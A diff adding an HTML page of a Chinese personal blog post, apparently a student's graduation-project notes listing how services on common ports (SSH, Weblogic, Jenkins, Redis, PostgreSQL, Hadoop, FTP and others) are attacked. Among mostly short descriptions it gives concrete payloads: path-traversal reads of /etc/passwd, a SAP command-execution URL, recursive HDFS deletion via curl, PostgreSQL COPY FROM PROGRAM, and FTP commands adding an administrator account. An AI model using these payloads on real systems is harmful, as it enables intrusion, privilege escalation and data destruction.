@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>常见端口的利用方法(毕设) | 个人博客</title>
+    <meta name="generator" content="VuePress 1.9.9">
+    <link rel="icon" href="/wangdengdeng/favicon.ico">
+    <meta name="description" content="个人博客">
+    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+    
+    <link rel="preload" href="/wangdengdeng/assets/css/0.styles.aece1d96.css" as="style"><link rel="preload" href="/wangdengdeng/assets/js/app.3ead440b.js" as="script"><link rel="preload" href="/wangdengdeng/assets/js/6.e2e47644.js" as="script"><link rel="preload" href="/wangdengdeng/assets/js/23.27aafa76.js" as="script"><link rel="prefetch" href="/wangdengdeng/assets/js/10.1b19dda1.js"><link rel="prefetch" href="/wangdengdeng/assets/js/11.90a6197a.js"><link rel="prefetch" href="/wangdengdeng/assets/js/12.ec953b45.js"><link rel="prefetch" href="/wangdengdeng/assets/js/13.91309f29.js"><link rel="prefetch" href="/wangdengdeng/assets/js/14.46d74e6d.js"><link rel="prefetch" href="/wangdengdeng/assets/js/15.c2d45576.js"><link rel="prefetch" href="/wangdengdeng/assets/js/16.543c64f2.js"><link rel="prefetch" href="/wangdengdeng/assets/js/17.15cac768.js"><link rel="prefetch" href="/wangdengdeng/assets/js/18.90b9c462.js"><link rel="prefetch" href="/wangdengdeng/assets/js/19.fe2d4f51.js"><link rel="prefetch" href="/wangdengdeng/assets/js/2.53fca3c4.js"><link rel="prefetch" href="/wangdengdeng/assets/js/20.bfd6aebf.js"><link rel="prefetch" href="/wangdengdeng/assets/js/21.515867c5.js"><link rel="prefetch" href="/wangdengdeng/assets/js/22.5246510c.js"><link rel="prefetch" href="/wangdengdeng/assets/js/24.afd0d259.js"><link rel="prefetch" href="/wangdengdeng/assets/js/25.b06b9259.js"><link rel="prefetch" href="/wangdengdeng/assets/js/26.256455b7.js"><link rel="prefetch" href="/wangdengdeng/assets/js/27.aa0ca491.js"><link rel="prefetch" href="/wangdengdeng/assets/js/28.5e0e29c0.js"><link rel="prefetch" href="/wangdengdeng/assets/js/3.cb810e63.js"><link rel="prefetch" href="/wangdengdeng/assets/js/4.6efe2eb7.js"><link rel="prefetch" href="/wangdengdeng/assets/js/5.63f29a16.js"><link rel="prefetch" href="/wangdengdeng/assets/js/7.8704393b.js"><link rel="prefetch" href="/wangdengdeng/assets/js/8.4837a75b.js"><link rel="prefetch" href="/wangdengdeng/assets/js/9.5a7ccf82.js">
+    <link rel="stylesheet" href="/wangdengdeng/assets/css/0.styles.aece1d96.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div id="global-layout" data-v-7f2e4136><header class="header-container" style="background-size:cover;background-repeat:no-repeat;background-position:center;background-attachment:scroll;background-image:url(/wangdengdeng/post-bg.jpeg);" data-v-93921ff8 data-v-7f2e4136><nav class="navbar" style="position:absolute;opacity:1;transition:all 0.5s ease-in-out;" data-v-93921ff8><a href="/wangdengdeng/" class="navbar-link router-link-active">
+    
+  </a> <ul class="navbar-links"><li><a href="/wangdengdeng/" class="router-link-active">
+        主页
+      </a></li><li><a href="/wangdengdeng/about/">
+        关于作者
+      </a></li><li><a href="/wangdengdeng/tags/">
+        技术栈
+      </a></li></ul> <div id="nav-icon"><span></span><span></span><span></span></div></nav> <div class="header-title" data-v-93921ff8 data-v-93921ff8><h1 data-v-93921ff8>常见端口的利用方法(毕设)</h1> <p data-v-93921ff8></p></div></header> <div class="container" data-v-b3fda33c data-v-7f2e4136><main class="main" style="width:60%;" data-v-b3fda33c><div class="post" data-v-b3fda33c data-v-b3fda33c><article class="main-div"><div class="post-content content content__default"><p>本篇博客主要是对常见端口的利用姿势做出总结，以便毕业设计项目使用.</p> <h1 id="常见端口的利用方法-毕业设计使用"><a href="#常见端口的利用方法-毕业设计使用" class="header-anchor">#</a> 常见端口的利用方法（毕业设计使用）</h1> <h2 id="_1、远程管理端口"><a href="#_1、远程管理端口" class="header-anchor">#</a> <strong>1、远程管理端口</strong></h2> <p><strong>22 端口（SSH）</strong></p> <div class="language-undefined extra-class"><pre class="language-text"><code>安全攻击：弱口令、暴力猜解、用户名枚举
+利用方式：
+1、通过用户名枚举可以判断某个用户名是否存在于目标主机中，
+2、利用弱口令/暴力破解，获取目标主机权限。
+</code></pre></div><p><strong>23 端口（Telnet）</strong></p> <div class="language-undefined extra-class"><pre class="language-text"><code>安全漏洞：弱口令、明文传输
+利用方式：
+1、通过弱口令或暴力破解，获取目标主机权限。
+2、嗅探抓取telnet明文账户密码。
+</code></pre></div><p><strong>3389 端口（RDP）</strong></p> <div class="language-undefined extra-class"><pre class="language-text"><code>安全漏洞：暴力破解
+利用方式：通过弱口令或暴力破解，获取目标主机权限。
+</code></pre></div><p><strong>5632 端口（Pcanywhere）</strong></p> <div class="language-undefined extra-class"><pre class="language-text"><code>安全漏洞：弱口令、暴力破解
+利用方式：通过弱口令或暴力破解，获取目标主机权限
+</code></pre></div><p><strong>5900 端口（VNC）</strong></p> <div class="language-undefined extra-class"><pre class="language-text"><code>安全漏洞：弱口令、暴力破解
+利用方式：通过弱口令或暴力破解，获取目标主机权限。
+</code></pre></div><hr> <h2 id="_2、web中间件-服务端口"><a href="#_2、web中间件-服务端口" class="header-anchor">#</a> <strong>2、Web中间件/服务端口</strong></h2> <p><strong>1090/1099 端口（RMI）</strong></p> <div class="language-undefined extra-class"><pre class="language-text"><code>安全漏洞：JAVA RMI 反序列化远程命令执行漏洞
+利用方式：使用nmap检测端口信息。
+端口信息：1099/1090    Java-rmi    Java RMI Registry
+检测工具：attackRMI.jar
+</code></pre></div><p><strong>7001 端口（Weblogic）</strong></p> <div class="language-undefined extra-class"><pre class="language-text"><code>安全漏洞：弱口令、SSRF、反序列化漏洞
+利用方式：
+1、控制台弱口令上传war木马 
+2、SSRF内网探测 
+3、反序列化远程代码执行等
+</code></pre></div><p><strong>8000 端口（jdwp）</strong></p> <div class="language-javascript extra-class"><pre class="language-javascript"><code>安全漏洞：<span class="token constant">JDWP</span> 远程命令执行漏洞
+端口信息：
+      <span class="token number">8000</span>             jdwp           java Debug Wire Protocol
+<span class="token literal-property property">检测工具：https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>IOActive<span class="token operator">/</span>jdwp<span class="token operator">-</span>shellifier
+</code></pre></div><p><strong>8080 端口（Tomcat）</strong></p> <div class="language-undefined extra-class"><pre class="language-text"><code>安全漏洞：弱口令、示例目录
+利用方式：通过弱口令登录控制台，上传war包。
+</code></pre></div><p><strong>8080 端口（Jboss）</strong></p> <div class="language-javascript extra-class"><pre class="language-javascript"><code>安全漏洞：未授权访问、反序列化。
+利用方式：
+<span class="token number">1</span>、未授权访问控制台，远程部署木马
+<span class="token number">2</span>、反序列化导致远程命令执行等。
+<span class="token literal-property property">检测工具：https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>joaomatosf<span class="token operator">/</span>jexboss
+</code></pre></div><p><strong>8080 端口（Resin）</strong></p> <div class="language-makefile extra-class"><pre class="language-makefile"><code>安全漏洞：目录遍历、远程文件读取
+利用方式：通过目录遍历/远程文件读取获取敏感信息，为进一步攻击提供必要的信息。
+
+任意文件读取POC：
+payload1 <span class="token operator">=</span> <span class="token string">&quot;/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd&quot;</span>
+payload2 <span class="token operator">=</span> <span class="token string">&quot;/resin-doc/examples/jndi-appconfig/test?inputFile=../../../../../../../../../../etc/passwd&quot;</span>
+payload3 <span class="token operator">=</span> <span class="token string">&quot;/ ..\\\\web-inf&quot;</span>
+</code></pre></div><p><strong>8080 端口（Jetty）</strong></p> <div class="language-javascript extra-class"><pre class="language-javascript"><code>安全漏洞：远程共享缓冲区泄漏
+利用方式：攻击者可以通过精心构造headers值来触发异常并偏移到共享缓冲区，其中包含了之前其他用户提交的请求，服务器会根据攻击者的payload返回特定位置的数据。
+<span class="token literal-property property">检测工具：https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>GDSSecurity<span class="token operator">/</span>Jetleak<span class="token operator">-</span>Testing<span class="token operator">-</span>Script
+</code></pre></div><p><strong>8080 端口（GlassFish）</strong></p> <div class="language-bash extra-class"><pre class="language-bash"><code>安全漏洞：弱口令、任意文件读取
+利用方式：
+<span class="token number">1</span>、弱口令admin/admin，直接部署shell 
+<span class="token number">2</span>、任意文件读取获取服务器敏感配置信息
+</code></pre></div><p><strong>8080 端口（Jenkins）</strong></p> <div class="language-javascript extra-class"><pre class="language-javascript"><code>安全漏洞：未授权访问 、远程代码执行
+利用方式：访问如下url，可以执行脚本命令，反弹shell，写入webshell等。
+<span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token operator">&lt;</span>target<span class="token operator">&gt;</span><span class="token operator">:</span><span class="token number">8080</span><span class="token operator">/</span>manage
+<span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token operator">&lt;</span>target<span class="token operator">&gt;</span><span class="token operator">:</span><span class="token number">8080</span><span class="token operator">/</span>script
+</code></pre></div><p><strong>8161 端口（ActiveMQ）</strong></p> <div class="language-bash extra-class"><pre class="language-bash"><code>安全漏洞：弱口令、任意文件写入、反序列化
+利用方式：默认密码admin/admin登陆控制台、写入webshell、上传ssh key等方式。
+</code></pre></div><p><strong>9043 端口（webSphere）</strong></p> <div class="language-ruby extra-class"><pre class="language-ruby"><code>安全漏洞：控制台弱口令、远程代码执行
+后台地址：https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token operator">:</span><span class="token number">9043</span><span class="token operator">/</span>ibm<span class="token operator">/</span>console<span class="token operator">/</span>logon<span class="token punctuation">.</span>jsp
+</code></pre></div><p><strong>50000 端口 （SAP）</strong></p> <div class="language-ruby extra-class"><pre class="language-ruby"><code>安全漏洞：远程代码执行
+利用方式：攻击者通过构造url请求，实现远程代码执行。
+<span class="token symbol">POC</span><span class="token symbol">:http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token operator">&lt;</span>target<span class="token operator">&gt;</span><span class="token operator">:</span><span class="token number">50000</span><span class="token operator">/</span>ctc<span class="token operator">/</span>servlet<span class="token operator">/</span>com<span class="token punctuation">.</span>sap<span class="token punctuation">.</span>ctc<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ConfigServlet<span class="token operator">?</span>param<span class="token operator">=</span>com<span class="token punctuation">.</span>sap<span class="token punctuation">.</span>ctc<span class="token punctuation">.</span>util<span class="token punctuation">.</span>FileSystemConfig<span class="token punctuation">;</span><span class="token constant">EXECUTE_CMD</span><span class="token punctuation">;</span><span class="token constant">CMDLINE</span><span class="token operator">=</span>cmd<span class="token punctuation">.</span>exe <span class="token operator">/</span>c ipconfig <span class="token operator">/</span>all
+</code></pre></div><p><strong>50070 端口（hadoop）</strong></p> <div class="language-sql extra-class"><pre class="language-sql"><code>安全漏洞：未授权访问
+利用方式：攻击者可以通过命令行操作多个目录下的数据，如进行删除操作。
+curl <span class="token operator">-</span>i <span class="token operator">-</span>X <span class="token keyword">DELETE</span> “http:<span class="token comment">//ip:50070/webhdfs/v1/tmp?op=DELETE&amp;recursive=true“</span>
+curl <span class="token operator">-</span>i <span class="token operator">-</span>X PUT “http:<span class="token comment">//ip:50070/webhdfs/v1/NODATA4U_SECUREYOURSHIT?op=MKDIRS“</span>
+</code></pre></div><hr> <h2 id="_3、数据库端口"><a href="#_3、数据库端口" class="header-anchor">#</a> <strong>3、数据库端口</strong></h2> <p><strong>389 端口（ldap）</strong></p> <div class="language-undefined extra-class"><pre class="language-text"><code>安全漏洞：未授权访问 、弱口令
+利用方式：通过LdapBrowser工具直接连入。
+</code></pre></div><p><strong>1433 端口（Mssql）</strong></p> <div class="language-undefined extra-class"><pre class="language-text"><code>安全漏洞：弱口令、暴力破解
+利用方式：差异备份getshell、SA账户提权等
+</code></pre></div><p><strong>1521 端口（Oracle）</strong></p> <div class="language-undefined extra-class"><pre class="language-text"><code>安全漏洞：弱口令、暴力破解
+利用方式：通过弱口令/暴力破解进行入侵。
+</code></pre></div><p><strong>3306 端口（MySQL）</strong></p> <div class="language-undefined extra-class"><pre class="language-text"><code>安全漏洞：弱口令、暴力破解
+利用方式：利用日志写入webshell、udf提权、mof提权等。
+</code></pre></div><p><strong>5432 端口（ PostgreSQL）</strong></p> <div class="language-sql extra-class"><pre class="language-sql"><code>安全漏洞：弱口令、高权限命令执行
+利用方式：攻击者通过弱口令获取账号信息，连入postgres中，可执行系统命令。
+PoC参考：
+    <span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token keyword">EXISTS</span> cmd_exec<span class="token punctuation">;</span>
+    <span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> cmd_exec<span class="token punctuation">(</span>cmd_output <span class="token keyword">text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    COPY cmd_exec <span class="token keyword">FROM</span> PROGRAM <span class="token string">'id'</span><span class="token punctuation">;</span>
+    <span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> cmd_exec<span class="token punctuation">;</span>
+</code></pre></div><p><strong>5984 端口（CouchDB）</strong></p> <div class="language-javascript extra-class"><pre class="language-javascript"><code>安全漏洞：垂直权限绕过、任意命令执行
+利用方式：通过构造数据创建管理员用户，使用管理员用户登录，构造恶意请求触发任意命令执行。
+<span class="token literal-property property">后台访问：http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token operator">&lt;</span>target<span class="token operator">&gt;</span><span class="token operator">:</span><span class="token number">5984</span><span class="token operator">/</span>_utils
+
+</code></pre></div><p><strong>6379 端口（Redis）</strong></p> <div class="language-mipsasm extra-class"><pre class="language-text"><code>安全漏洞：未授权访问
+利用方式：绝对路径写webshell 、利用计划任务执行命令反弹shell、
+公私钥认证获取root权限、主从复制RCE等。
+</code></pre></div><p><strong>9200 端口（elasticsearch）</strong></p> <div class="language-javascript extra-class"><pre class="language-javascript"><code>安全漏洞：未授权访问、命令执行
+检测方式：
+<span class="token number">1</span>、直接访问如下url，获取相关敏感信息。
+  <span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token operator">&lt;</span>target<span class="token operator">&gt;</span><span class="token operator">:</span><span class="token number">9200</span><span class="token operator">/</span>_nodes  
+查看节点数据
+  <span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token operator">&lt;</span>target<span class="token operator">&gt;</span><span class="token operator">:</span><span class="token number">9200</span><span class="token operator">/</span>_river  查看数据库敏感信息
+<span class="token number">2</span>、通过构造特定的数据包，执行任意命令。
+</code></pre></div><p><strong>11211 端口（MemCache）</strong></p> <div class="language-xml extra-class"><pre class="language-xml"><code>安全漏洞：未授权访问
+检测方式：无需用户名密码，可以直接连接memcache 服务的11211端口。
+nc -vv <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">&gt;</span></span> 11211
+</code></pre></div><p><strong>27017 端口（Mongodb）</strong></p> <div class="language-undefined extra-class"><pre class="language-text"><code>安全漏洞：未授权访问、弱口令
+利用方式：未授权访问/弱口令，远程连入数据库，导致敏感信息泄露。
+</code></pre></div><hr> <h2 id="_4、常见协议端口"><a href="#_4、常见协议端口" class="header-anchor">#</a> <strong>4、常见协议端口</strong></h2> <p><strong>21 端口（FTP)</strong></p> <div class="language-bash extra-class"><pre class="language-bash"><code>安全漏洞：1、配置不当    <span class="token number">2</span>、明文传输    <span class="token number">3</span>、第三方软件提权
+利用方式：
+<span class="token number">1</span>、匿名登录或弱口令
+<span class="token number">2</span>、嗅探ftp用户名和密码
+<span class="token number">3</span>、Serv-U权限较大的账号可导致系统命令执行。
+FTP提权命令：
+  <span class="token comment"># 增加系统用户</span>
+   Quote site <span class="token builtin class-name">exec</span> net user <span class="token number">4567</span> <span class="token number">4567</span> /add
+  <span class="token comment"># 提升到管理员权限</span>
+   Quote site <span class="token builtin class-name">exec</span> net localgroup administrators <span class="token number">4567</span> /add
+</code></pre></div><p><strong>25 端口（SMTP）</strong></p> <div class="language-cs extra-class"><pre class="language-cs"><code>攻击方式：<span class="token number">1</span>、匿名发送邮件 <span class="token number">2</span>、弱口令 <span class="token number">3</span>、SMTP用户枚举
+利用方式：
+<span class="token number">1</span>、SMTP服务器配置不当，攻击者可以使用任意用户发送邮件。
+<span class="token number">2</span>、SMTP弱口令扫描，获取用户账号密码，发送邮件钓鱼。
+<span class="token number">3</span>、通过SMTP用户枚举获取用户名：
+   nmap <span class="token operator">-</span>p <span class="token number">25</span> <span class="token operator">--</span> smtp<span class="token operator">-</span><span class="token keyword">enum</span><span class="token operator">-</span>users<span class="token punctuation">.</span>nse <span class="token operator">&lt;</span>target<span class="token operator">&gt;</span>
+</code></pre></div><p><strong>53 端口（DNS）</strong></p> <div class="language-mipsasm extra-class"><pre class="language-text"><code>安全攻击：1、DNS域传送漏洞、DNS欺骗、DNS缓存投毒
+检测方式：
+1、DNS域传送漏洞，Windows下检测使用nslookup命令，Linux下检测使用dig命令，通过执行命令可以清楚的看到域名解析情况。
+2、DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。
+3、DNS缓存投毒是攻击者欺骗DNS服务器相信伪造的DNS响应的真实性。
+</code></pre></div><p><strong>161 端口（SNMP）</strong></p> <div class="language-xml extra-class"><pre class="language-xml"><code>安全漏洞：默认团体名/弱口令访问
+利用方式：通过nmap自带的审计脚本进行检测，可能导致敏感信息泄露。。
+1、弱口令检测：nmap –sU –p161 –script=snmp-brute <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">&gt;</span></span>
+2、获取系统信息：nmap –sU –p161 –script=snmp-sysdescr <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">&gt;</span></span>
+3、获取用户信息：nmap -sU -p161 --script=snmp-win32-user <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">&gt;</span></span>
+4、获取网络端口状态：nmap -sU -p161 --script=snmp-netstat <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">&gt;</span></span>
+</code></pre></div><p><strong>443 端口（SSL）</strong></p> <div class="language-xml extra-class"><pre class="language-xml"><code>安全漏洞：OpenSSL 心脏出血
+利用方式：攻击者可以远程读取存在漏洞版本的openssl服务器内存中长大64K的数据。
+扫描脚本：nmap -sV --script=ssl-heartbleed <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">&gt;</span></span>
+</code></pre></div><p><strong>445 端口（SMB）</strong></p> <div class="language-undefined extra-class"><pre class="language-text"><code>安全漏洞：信息泄露、远程代码执行
+利用方式：可利用共享获取敏感信息、缓冲区溢出导致远程代码执行，如ms17010。
+</code></pre></div><p><strong>873 端口（Rsync）</strong></p> <div class="language-bash extra-class"><pre class="language-bash"><code>安全漏洞：匿名访问、弱口令
+利用方式：攻击者可以执行下载/上传等操作，也可以尝试上传webshell。
+<span class="token number">1</span>、下载：<span class="token comment">#rsync -avz a.b.c.d::path/file path/filiname  </span>
+<span class="token number">2</span>、上传：<span class="token comment">#rsync -avz path/filename a.b.c.d::path/file</span>
+</code></pre></div><p><strong>2181 端口（Zookeeper）</strong></p> <div class="language-bash extra-class"><pre class="language-bash"><code>安全漏洞：未授权访问
+检测方式：攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。
+ <span class="token builtin class-name">echo</span> envi <span class="token operator">|</span> <span class="token function">nc</span> <span class="token function">ip</span> port
+</code></pre></div><p><strong>2375 端口（Docker）</strong></p> <div class="language-php extra-class"><pre class="language-php"><code>安全漏洞：未授权方式
+检测方式：通过docker daemon api 执行docker命令。
+<span class="token comment">#列出容器信息，效果与docker ps -a 一致。</span>
+ 
+curl http<span class="token punctuation">:</span><span class="token comment">//&lt;target&gt;:2375/containers/json</span>
+ 
+docker <span class="token operator">-</span><span class="token constant">H</span> tcp<span class="token punctuation">:</span><span class="token comment">//&lt;target&gt;:2375 start &lt;Container Id&gt;</span>
+</code></pre></div></div></article> <div class="main-div vssue"><!----></div></div></main> <aside class="aside" data-v-b3fda33c data-v-b3fda33c><div class="info-card main-div" data-v-1311ce9e data-v-b3fda33c><div class="info-card-header" style="background-size:cover;background-repeat:no-repeat;background-position:center;background-attachment:scroll;background-image:url(/wangdengdeng/avatar-bg.jpeg);" data-v-1311ce9e><img src="/wangdengdeng/avatar-top.jpeg" alt="20046219-王敬泽" class="info-avatar" data-v-1311ce9e></div> <div class="info-card-body" data-v-1311ce9e><section class="info-name" data-v-1311ce9e>
+      20046219-王敬泽
+    </section> <section class="info-desc" data-v-1311ce9e>I am a slow walker, but I never walk backwards.<br/>道阻且长,行则将至</section> <section class="info-contact" data-v-1311ce9e><section data-v-1311ce9e><span data-v-1311ce9e data-v-1311ce9e><svg class="icon" style="font-size:1em;" data-v-1311ce9e data-v-1311ce9e><use xlink:href="#icon-location" data-v-1311ce9e data-v-1311ce9e></use></svg><span class="info-text" data-v-1311ce9e data-v-1311ce9e>
+          China
+        </span></span></section> <!----> <section data-v-1311ce9e><span data-v-1311ce9e data-v-1311ce9e><svg class="icon" style="font-size:1em;" data-v-1311ce9e data-v-1311ce9e><use xlink:href="#icon-email" data-v-1311ce9e data-v-1311ce9e></use></svg><span class="info-text" data-v-1311ce9e data-v-1311ce9e>
+          1055192032@qq.com
+        </span></span></section></section></div> <div class="info-card-footer" data-v-1311ce9e><p class="footer-sns-link" data-v-1311ce9e></p></div></div> <div class="post-toc main-div aside-toc" style="position:relative;top:0;width:0px;" data-v-b3fda33c><h4>- CATALOG</h4> <div class="post-nav-toc"><ul><li><a href="/wangdengdeng/posts/2024/03/30/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3.html#_1、远程管理端口">1、远程管理端口</a></li><li><a href="/wangdengdeng/posts/2024/03/30/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3.html#_2、web中间件-服务端口">2、Web中间件/服务端口</a></li><li><a href="/wangdengdeng/posts/2024/03/30/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3.html#_3、数据库端口">3、数据库端口</a></li><li><a href="/wangdengdeng/posts/2024/03/30/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3.html#_4、常见协议端口">4、常见协议端口</a></li></ul></div></div></aside></div> <footer class="footer" data-v-7f2e4136><p class="footer-sns-link"></p> <div class="copyright"><span id="custom">Copyright &copy; WADE_2ng 2020 <br /> 
+        Theme By <a href="https://www.vuepress.cn/" target="_blank">VuePress</a></span> <!----></div></footer></div><div class="global-ui"><!----><!----></div></div>
+    <script src="/wangdengdeng/assets/js/app.3ead440b.js" defer></script><script src="/wangdengdeng/assets/js/6.e2e47644.js" defer></script><script src="/wangdengdeng/assets/js/23.27aafa76.js" defer></script>
+  </body>
+</html>
